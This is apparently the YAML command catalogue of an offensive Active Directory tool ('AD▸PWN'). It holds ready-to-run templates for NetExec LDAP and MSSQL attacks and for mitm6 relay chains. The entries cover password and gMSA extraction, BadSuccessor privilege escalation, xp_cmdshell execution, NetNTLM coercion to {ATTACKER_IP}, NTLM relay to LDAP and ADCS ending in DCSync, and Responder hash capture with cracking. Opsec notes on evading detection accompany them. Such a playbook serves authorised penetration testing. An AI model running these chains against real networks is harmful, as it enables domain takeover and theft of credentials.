        cmd: "nxc ldap {DC_IP} -u '{USERNAME}' -p '{PASSWORD}' -d {DOMAIN} --admin-count"
      - label: "Active users only"
        cmd: "nxc ldap {DC_IP} -u '{USERNAME}' -p '{PASSWORD}' -d {DOMAIN} --active-users"
      - label: "Get domain SID"
        cmd: "nxc ldap {DC_IP} -u '{USERNAME}' -p '{PASSWORD}' -d {DOMAIN} --get-sid"
      - label: "All-in-one enumeration"
        cmd: "nxc ldap {DC_IP} -u '{USERNAME}' -p '{PASSWORD}' -d {DOMAIN} --trusted-for-delegation --password-not-required --admin-count --users --groups"
    opsec: >
      All LDAP read operations — very low noise. Standard LDAP queries blend
      with normal domain computer traffic.
    cleanup: []

  - id: nxc_ldap_daclread
    name: NXC LDAP — daclread (ACL Enumeration)
    tab: Enumeration
    requires: [DC_IP, USERNAME, PASSWORD, DOMAIN, TARGET_USER]
    tags: [nxc, ldap, daclread, acl, dacl, genericall, permissions]
    description: >
      Read DACL (Discretionary Access Control List) entries for specific AD
      objects. Find GenericAll, GenericWrite, WriteDACL, ForceChangePassword
      rights that enable privilege escalation. Much quieter than BloodHound
      for targeted ACL checks.
    commands:
      - label: "Read all ACEs for a target user"
        cmd: "nxc ldap {DC_IP} -u '{USERNAME}' -p '{PASSWORD}' -d {DOMAIN} -M daclread -o TARGET={TARGET_USER} RIGHTS='*'"
      - label: "Find who has GenericAll over target"
        cmd: "nxc ldap {DC_IP} -u '{USERNAME}' -p '{PASSWORD}' -d {DOMAIN} -M daclread -o TARGET={TARGET_USER} RIGHTS=FullControl"
      - label: "Read ACEs for a group"
        cmd: "nxc ldap {DC_IP} -u '{USERNAME}' -p '{PASSWORD}' -d {DOMAIN} -M daclread -o TARGET='Domain Admins' RIGHTS='*'"
      - label: "Find ForceChangePassword rights"
        cmd: "nxc ldap {DC_IP} -u '{USERNAME}' -p '{PASSWORD}' -d {DOMAIN} -M daclread -o TARGET={TARGET_USER} RIGHTS=ForceChangePassword"
    opsec: >
      LDAP read only — very low noise compared to BloodHound collection.
    cleanup: []

  - id: nxc_ldap_enum_trusts
    name: NXC LDAP — enum_trusts (Domain Trust Enumeration)
    tab: Enumeration
    requires: [DC_IP, USERNAME, PASSWORD, DOMAIN]
    tags: [nxc, ldap, enum-trusts, trusts, cross-domain, forest]
    description: >
      Enumerate domain and forest trusts via LDAP. Shows trust direction,
      type, and attributes. Key for planning cross-domain attack paths.
    commands:
      - label: "Enumerate all domain trusts"
        cmd: "nxc ldap {DC_IP} -u '{USERNAME}' -p '{PASSWORD}' -d {DOMAIN} -M enum_trusts"
      - label: "Raw LDAP trust query"
        cmd: "nxc ldap {DC_IP} -u '{USERNAME}' -p '{PASSWORD}' -d {DOMAIN} --query '(objectClass=trustedDomain)' 'name trustType trustDirection trustAttributes'"
    opsec: >
      LDAP read — very low noise.
    cleanup: []

  - id: nxc_ldap_pre2k
    name: NXC LDAP — pre2k (Pre-Created Computer Account Abuse)
    tab: Credential Attacks
    requires: [DC_IP, USERNAME, PASSWORD, DOMAIN]
    tags: [nxc, ldap, pre2k, computer-account, weak-password, lateral]
    description: >
      Find computer accounts created with the 'Assign this computer account as
      a pre-Windows 2000 computer' option — their password is the same as the
      lowercase computer name (no $). Often overlooked misconfiguration in older
      domains. Provides machine account access for RBCD and other attacks.
    commands:
      - label: "Find pre-Windows 2000 computer accounts"
        cmd: "nxc ldap {DC_IP} -u '{USERNAME}' -p '{PASSWORD}' -d {DOMAIN} -M pre2k"
      - label: "Test found account (password = lowercase computer name)"
        cmd: "nxc smb {DC_IP} -u 'computername$' -p 'computername' -d {DOMAIN}"
    opsec: >
      LDAP query — very low noise. Auth test generates 4624/4625.
    cleanup: []

  - id: nxc_ldap_maq_addcomputer
    name: NXC LDAP — maq + add-computer (Machine Account Quota)
    tab: Privilege Escalation
    requires: [DC_IP, USERNAME, PASSWORD, DOMAIN]
    tags: [nxc, ldap, maq, add-computer, rbcd, nopac, machine-account]
    description: >
      Check Machine Account Quota (default=10) then add a computer account
      as prerequisite for RBCD, NoPac, and other machine-account-dependent attacks.
    commands:
      - label: "Check Machine Account Quota"
        cmd: "nxc ldap {DC_IP} -u '{USERNAME}' -p '{PASSWORD}' -d {DOMAIN} -M maq"
      - label: "Add computer account via LDAP"
        cmd: "nxc ldap {DC_IP} -u '{USERNAME}' -p '{PASSWORD}' -d {DOMAIN} -M add-computer -o NAME='ATTACKPC$' PASSWORD='AttackPass123!'"
      - label: "Verify computer was added"
        cmd: "nxc ldap {DC_IP} -u '{USERNAME}' -p '{PASSWORD}' -d {DOMAIN} --computers | grep -i 'ATTACKPC'"
    opsec: >
      Computer creation generates 4741. Detectable — clean up the account
      when done with the attack chain.
    cleanup:
      - label: "Delete the computer account"
        cmd: "nxc ldap {DC_IP} -u '{USERNAME}' -p '{PASSWORD}' -d {DOMAIN} -M add-computer -o NAME='ATTACKPC$' DELETE=True"

  - id: nxc_ldap_groupmembership
    name: NXC LDAP — groupmembership (User Group Membership)
    tab: Enumeration
    requires: [DC_IP, USERNAME, PASSWORD, DOMAIN, TARGET_USER]
    tags: [nxc, ldap, groupmembership, groups, privileges]
    description: >
      Query all group memberships for a specific user. Fast targeted check to
      understand what privileges a compromised account has without running
      full BloodHound collection.
    commands:
      - label: "Get groups for specific user"
        cmd: "nxc ldap {DC_IP} -u '{USERNAME}' -p '{PASSWORD}' -d {DOMAIN} -M groupmembership -o USER='{TARGET_USER}'"
      - label: "Add user to group (if GenericAll on group)"
        cmd: "nxc ldap {DC_IP} -u '{USERNAME}' -p '{PASSWORD}' -d {DOMAIN} -M groupmembership -o USER='{USERNAME}' GROUP='Domain Admins'"
    opsec: >
      LDAP read — very low noise.
    cleanup: []

  - id: nxc_ldap_credential_modules
    name: "NXC LDAP — Credential Modules (get-userPassword / get-unixUserPassword / gmsa)"
    tab: Credential Attacks
    requires: [DC_IP, USERNAME, PASSWORD, DOMAIN]
    tags: [nxc, ldap, userpassword, unix, gmsa, credentials]
    description: >
      Extract passwords stored in non-standard LDAP attributes. userPassword
      and unixUserPassword are used by Unix/Linux integrations and sometimes
      contain cleartext passwords. gMSA dumps managed service account passwords
      if your account has ReadGMSAPassword rights.
    commands:
      - label: "Read userPassword attribute (legacy — may be cleartext)"
        cmd: "nxc ldap {DC_IP} -u '{USERNAME}' -p '{PASSWORD}' -d {DOMAIN} -M get-userPassword"
      - label: "Read unixUserPassword attribute"
        cmd: "nxc ldap {DC_IP} -u '{USERNAME}' -p '{PASSWORD}' -d {DOMAIN} -M get-unixUserPassword"
      - label: "Extract gMSA passwords (requires ReadGMSAPassword rights)"
        cmd: "nxc ldap {DC_IP} -u '{USERNAME}' -p '{PASSWORD}' -d {DOMAIN} --gmsa"
      - label: "Convert gMSA ID to hash"
        cmd: "nxc ldap {DC_IP} -u '{USERNAME}' -p '{PASSWORD}' -d {DOMAIN} --gmsa-convert-id <ID>"
      - label: "Decrypt gMSA from LSA secrets (if you have LSA dump)"
        cmd: "nxc ldap {DC_IP} -u '{USERNAME}' -p '{PASSWORD}' -d {DOMAIN} --gmsa-decrypt-lsa <GMSA_ACCOUNT>"
    opsec: >
      LDAP reads — very low noise. gMSA password reads are logged by some
      enhanced auditing configurations.
    cleanup: []

  - id: nxc_ldap_get_network
    name: NXC LDAP — get-network (DNS Records from AD)
    tab: Enumeration
    requires: [DC_IP, USERNAME, PASSWORD, DOMAIN]
    tags: [nxc, ldap, get-network, dns, ips, infrastructure]
    description: >
      Pull DNS records and IP addresses directly from AD LDAP. Faster and
      more complete than nmap for internal network mapping — shows all AD-registered
      hosts including ones that don't respond to ICMP.
    commands:
      - label: "Extract all DNS records from AD"
        cmd: "nxc ldap {DC_IP} -u '{USERNAME}' -p '{PASSWORD}' -d {DOMAIN} -M get-network"
      - label: "Get DNS with full record details"
        cmd: "nxc ldap {DC_IP} -u '{USERNAME}' -p '{PASSWORD}' -d {DOMAIN} -M get-network -o FULL=True"
    opsec: >
      LDAP read of DNS partition — very low noise.
    cleanup: []

  - id: nxc_ldap_badsuccessor
    name: NXC LDAP — badsuccessor (dMSA Privilege Escalation 2025)
    tab: Privilege Escalation
    requires: [DC_IP, USERNAME, PASSWORD, DOMAIN, TARGET_USER]
    tags: [nxc, ldap, badsuccessor, dmsa, 2025, privesc, windows-server-2025]
    description: >
      BadSuccessor (2025): Exploit delegated Managed Service Account (dMSA)
      migration to inherit privileges of any account including Domain Admin.
      Requires Windows Server 2025 DC, CreateChild rights on any OU, and
      an unpatched environment. NXC module automates the full chain.
    commands:
      - label: "Check if environment is vulnerable"
        cmd: "nxc ldap {DC_IP} -u '{USERNAME}' -p '{PASSWORD}' -d {DOMAIN} -M badsuccessor"
      - label: "Exploit — inherit DA privileges"
        cmd: "nxc ldap {DC_IP} -u '{USERNAME}' -p '{PASSWORD}' -d {DOMAIN} -M badsuccessor -o TARGET={TARGET_USER} OU='OU=Computers,DC=domain,DC=local'"
    opsec: >
      Creates dMSA object (4741). New technique — limited detection coverage.
      Requires Server 2025 DC.
    cleanup:
      - label: "Delete created dMSA object"
        cmd: "nxc ldap {DC_IP} -u '{USERNAME}' -p '{PASSWORD}' -d {DOMAIN} -M badsuccessor -o CLEANUP=True"

  # ══════════════════════════════════════════════════════════════════════════════
  # MSSQL MODULES
  # ══════════════════════════════════════════════════════════════════════════════

  - id: nxc_mssql_modules
    name: "NXC MSSQL — Privilege & Lateral Modules (mssql_priv / enum_impersonate / enum_links / exec_on_link)"
    tab: Privilege Escalation
    requires: [TARGET, USERNAME, PASSWORD, DOMAIN]
    tags: [nxc, mssql, priv, impersonate, linked-servers, xp-cmdshell, lateral]
    description: >
      MSSQL-specific modules for privilege escalation and lateral movement.
      mssql_priv finds and exploits privesc paths automatically. enum_impersonate
      shows who can be impersonated. linked server modules enable pivoting across
      SQL server chains to reach targets not otherwise accessible.
    commands:
      - label: "Discover MSSQL servers on subnet"
        cmd: "nxc mssql {SUBNET}/24 -u '{USERNAME}' -p '{PASSWORD}' -d {DOMAIN}"
      - label: "mssql_priv — auto-find and exploit privesc paths"
        cmd: "nxc mssql {TARGET} -u '{USERNAME}' -p '{PASSWORD}' -d {DOMAIN} -M mssql_priv"
      - label: "enum_impersonate — find users you can impersonate"
        cmd: "nxc mssql {TARGET} -u '{USERNAME}' -p '{PASSWORD}' -d {DOMAIN} -M enum_impersonate"
      - label: "enum_logins — list all SQL logins"
        cmd: "nxc mssql {TARGET} -u '{USERNAME}' -p '{PASSWORD}' -d {DOMAIN} -M enum_logins"
      - label: "enum_links — list linked SQL servers"
        cmd: "nxc mssql {TARGET} -u '{USERNAME}' -p '{PASSWORD}' -d {DOMAIN} -M enum_links"
      - label: "exec_on_link — execute command on linked server"
        cmd: "nxc mssql {TARGET} -u '{USERNAME}' -p '{PASSWORD}' -d {DOMAIN} -M exec_on_link -o LINK='LINKEDSERVER' COMMAND='whoami'"
      - label: "link_enable_xp — enable xp_cmdshell on linked server"
        cmd: "nxc mssql {TARGET} -u '{USERNAME}' -p '{PASSWORD}' -d {DOMAIN} -M link_enable_xp -o LINK='LINKEDSERVER'"
      - label: "link_xpcmd — execute via linked server xp_cmdshell"
        cmd: "nxc mssql {TARGET} -u '{USERNAME}' -p '{PASSWORD}' -d {DOMAIN} -M link_xpcmd -o LINK='LINKEDSERVER' COMMAND='whoami'"
      - label: "xp_cmdshell direct execution"
        cmd: "nxc mssql {TARGET} -u '{USERNAME}' -p '{PASSWORD}' -d {DOMAIN} -x 'whoami'"
      - label: "xp_dirtree — capture NetNTLM via UNC"
        cmd: "nxc mssql {TARGET} -u '{USERNAME}' -p '{PASSWORD}' -d {DOMAIN} -q \"EXEC xp_dirtree '\\\\\\\\{ATTACKER_IP}\\\\share'\""
    opsec: >
      xp_cmdshell generates Windows process events (4688). Linked server
      hops appear in SQL audit logs. xp_dirtree creates outbound SMB connection.
    cleanup:
      - label: "Disable xp_cmdshell after use"
        cmd: "nxc mssql {TARGET} -u '{USERNAME}' -p '{PASSWORD}' -d {DOMAIN} -q \"EXEC sp_configure 'xp_cmdshell', 0; RECONFIGURE\""

# ╔══════════════════════════════════════════════════════════════════════════════╗
# ║   AD▸PWN — IPv6 / mitm6 Full Attack Chain (mitm6_attacks.yaml)             ║
# ║   DHCPv6 DNS Takeover / WPAD Abuse / NTLM Relay via IPv6                   ║
# ╚══════════════════════════════════════════════════════════════════════════════╝



  - id: mitm6_discovery
    name: mitm6 — IPv6 Network Discovery and Targeting
    tab: Enumeration
    requires: [DOMAIN, SUBNET]
    tags: [mitm6, ipv6, dhcpv6, enum, no-creds, relay]
    description: >
      Check if the network is vulnerable to mitm6 — Windows prefers IPv6 over
      IPv4 by default, and most networks have no DHCPv6 server. mitm6 spoof
      DHCPv6 responses to become the DNS server, then intercept WPAD/NTLM
      authentication for relay or capture. Works when SMB signing is enforced
      because it relays via LDAP/ADCS instead.
    commands:
      - label: "Check if IPv6 is enabled on hosts"
        cmd: "nmap -6 -sn {SUBNET}/24 2>/dev/null | grep 'scan report'"
      - label: "Check for DHCPv6 server (should return nothing if vulnerable)"
        cmd: "sudo nmap -sU -p 547 {SUBNET}/24 --open 2>/dev/null | grep 'open'"
      - label: "Check if WPAD is being requested (run tcpdump briefly)"
        cmd: "sudo tcpdump -i eth0 -n 'port 53 and udp' 2>/dev/null | grep -i wpad &"
      - label: "Test mitm6 reachability (dry run — no relay)"
        cmd: "sudo mitm6 -d {DOMAIN} --dry-run"
    opsec: >
      Passive network checks only. tcpdump is read-only. mitm6 --dry-run does
      not send any packets. Safe for initial recon.
    cleanup: []

  - id: mitm6_ldap_relay
    name: mitm6 + LDAP Relay — DNS Takeover → RBCD → Domain Admin
    tab: Privilege Escalation
    requires: [DC_IP, DOMAIN, ATTACKER_IP]
    tags: [mitm6, ipv6, dhcpv6, ldap, relay, rbcd, no-creds, no-smb-signing]
    description: >
      Full mitm6 → LDAP relay chain. mitm6 spoofs DHCPv6 to become DNS, then
      responds to WPAD requests, capturing NTLM authentication from hosts.
      Relay to LDAP for RBCD setup — then S4U2Proxy to impersonate DA.
      Works even with SMB signing enforced. Requires only network position —
      no credentials needed.
    commands:
      - label: "Terminal 1 — Start mitm6 (DHCPv6 + DNS spoofing)"
        cmd: "sudo mitm6 -d {DOMAIN} -i eth0"
      - label: "Terminal 2 — Start ntlmrelayx targeting LDAP for RBCD"
        cmd: "impacket-ntlmrelayx -6 -t ldaps://{DC_IP} -wh WPAD.{DOMAIN} --delegate-access --no-dump --no-da --no-acl --no-validate-privs"
      - label: "Wait for relay — ntlmrelayx creates RBCD computer account automatically"
        cmd: "# Watch ntlmrelayx output — it will print the created machine account name and password"
      - label: "Once relay succeeds — S4U to get DA ticket"
        cmd: "impacket-getST -spn 'cifs/{TARGET_COMPUTER}.{DOMAIN}' -impersonate administrator '{DOMAIN}/{CREATED_MACHINE}$:{CREATED_PASS}' -dc-ip {DC_IP}"
      - label: "Use ticket for access"
        cmd: "export KRB5CCNAME=./administrator@cifs_{TARGET_COMPUTER}.{DOMAIN}.ccache && impacket-secretsdump -k -no-pass '{DOMAIN}/administrator'@{TARGET_COMPUTER}.{DOMAIN}"
      - label: "If target is DC — DCSync"
        cmd: "export KRB5CCNAME=./administrator@cifs_{DC_FQDN}.ccache && impacket-secretsdump -k -no-pass '{DOMAIN}/administrator'@{DC_IP}"
    opsec: >
      mitm6 disrupts legitimate IPv6 traffic — visible on network monitoring.
      LDAP relay creates a new computer account (4741). Run in short bursts
      during business hours for max captures. Stop mitm6 after getting access.
    cleanup:
      - label: "Stop mitm6"
        cmd: "sudo pkill mitm6"
      - label: "Remove created machine account"
        cmd: "impacket-addcomputer '{DOMAIN}/{USERNAME}:{PASSWORD}' -computer-name '{CREATED_MACHINE}' -delete -dc-ip {DC_IP}"
      - label: "Remove RBCD attribute from target"
        cmd: "python3 rbcd.py -f {CREATED_MACHINE} -t {TARGET_COMPUTER} '{DOMAIN}/{USERNAME}:{PASSWORD}' -dc-ip {DC_IP} --remove"

  - id: mitm6_adcs_relay
    name: mitm6 + ADCS Relay — DNS Takeover → ESC8 → DCSync
    tab: Privilege Escalation
    requires: [DC_IP, CA_IP, DOMAIN, ATTACKER_IP]
    tags: [mitm6, ipv6, adcs, esc8, relay, dcsync, no-creds]
    description: >
      mitm6 → ADCS web enrollment relay chain. Captures DC machine account auth
      via mitm6/WPAD, relays to ADCS HTTP endpoint (ESC8), obtains DC certificate,
      authenticates as DC, then DCSync. The most complete no-creds-required
      domain compromise chain when ADCS HTTP enrollment is enabled.
    commands:
      - label: "Terminal 1 — Start mitm6"
        cmd: "sudo mitm6 -d {DOMAIN} -i eth0"
      - label: "Terminal 2 — Relay to ADCS web enrollment"
        cmd: "impacket-ntlmrelayx -6 -t https://{CA_IP}/certsrv/certfnsh.asp -wh WPAD.{DOMAIN} --adcs --template DomainController"
      - label: "Wait for DC to authenticate — cert saved to dc.pfx automatically"
        cmd: "# Watch for '[*] Saved certificate to dc.pfx' in ntlmrelayx output"
      - label: "Authenticate with DC cert"
        cmd: "certipy auth -pfx dc.pfx -dc-ip {DC_IP}"
      - label: "DCSync with obtained DC hash"
        cmd: "impacket-secretsdump '{DOMAIN}/DC$'@{DC_IP} -hashes :{DC_NTLM_HASH} -just-dc-ntlm"
    opsec: >
      mitm6 is noisy on network monitoring. ADCS relay logged on CA IIS.
      Certificate auth logged on DC. Run quickly and shut down mitm6 after
      obtaining the cert.
    cleanup:
      - label: "Stop mitm6"
        cmd: "sudo pkill mitm6"
      - label: "Remove cert files"
        cmd: "rm -f dc.pfx dc.ccache"

  - id: mitm6_shadow_credentials
    name: mitm6 + Shadow Credentials — DNS Takeover → msDS-KeyCredentialLink
    tab: Privilege Escalation
    requires: [DC_IP, DOMAIN, ATTACKER_IP, TARGET_COMPUTER]
    tags: [mitm6, ipv6, shadow-credentials, key-credential, ldap, relay]
    description: >
      mitm6 → LDAP relay to write msDS-KeyCredentialLink (shadow credentials)
      on a target computer object. Gives persistent certificate-based auth as
      that computer account — useful for targeting specific computers rather
      than the broad RBCD approach. Works against any computer object you can
      relay write access for.
    commands:
      - label: "Terminal 1 — Start mitm6"
        cmd: "sudo mitm6 -d {DOMAIN} -i eth0 --ignore-nofqdn"
      - label: "Terminal 2 — Relay to LDAP with shadow credentials"
        cmd: "impacket-ntlmrelayx -6 -t ldaps://{DC_IP} -wh WPAD.{DOMAIN} --shadow-credentials --shadow-target '{TARGET_COMPUTER}$'"
      - label: "Use obtained PFX for authentication"
        cmd: "certipy auth -pfx '{TARGET_COMPUTER}.pfx' -dc-ip {DC_IP}"
      - label: "Get machine TGT then S4U for admin access"
        cmd: "export KRB5CCNAME=./{TARGET_COMPUTER}.ccache && impacket-getST -self -impersonate administrator -altservice 'cifs/{TARGET_COMPUTER}.{DOMAIN}' -k -no-pass '{DOMAIN}/{TARGET_COMPUTER}$' -dc-ip {DC_IP}"
    opsec: >
      Shadow credential (msDS-KeyCredentialLink) write logged (5136). Less
      noisy than creating new machine accounts. Clean up after use.
    cleanup:
      - label: "Stop mitm6"
        cmd: "sudo pkill mitm6"
      - label: "Remove shadow credential"
        cmd: "certipy shadow remove -u '{USERNAME}@{DOMAIN}' -p '{PASSWORD}' -account '{TARGET_COMPUTER}$' -dc-ip {DC_IP}"

  - id: mitm6_wpad_capture
    name: mitm6 + Responder — WPAD Capture for Hash Cracking
    tab: Credential Attacks
    requires: [DOMAIN, ATTACKER_IP]
    tags: [mitm6, ipv6, wpad, responder, ntlmv2, capture, hash]
    description: >
      Use mitm6 for DNS and WPAD, Responder for credential capture without
      relaying. All captured NTLMv2 hashes can be cracked offline. Effective
      passive credential harvest — runs in the background during an engagement.
      Target workstations browsing the web, triggering WPAD auto-discovery.
    commands:
      - label: "Terminal 1 — Start mitm6 for DNS + WPAD"
        cmd: "sudo mitm6 -d {DOMAIN} -i eth0"
      - label: "Terminal 2 — Start Responder to capture (no relay)"
        cmd: "sudo responder -I eth0 -wd --no-http-server --no-smb-server"
      - label: "Monitor captured hashes"
        cmd: "tail -f /usr/share/responder/logs/Responder-Session.log | grep NTLMv2"
      - label: "Crack captured hashes"
        cmd: "hashcat -m 5600 /usr/share/responder/logs/NTLMv2-*.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule"
    opsec: >
      mitm6 disrupts IPv6 DNS for affected hosts. Responder poisons WPAD.
      Very visible on network monitoring. Run during business hours for max
      captures from active workstations.
    cleanup:
      - label: "Stop mitm6 and Responder"
        cmd: "sudo pkill mitm6; sudo pkill responder"

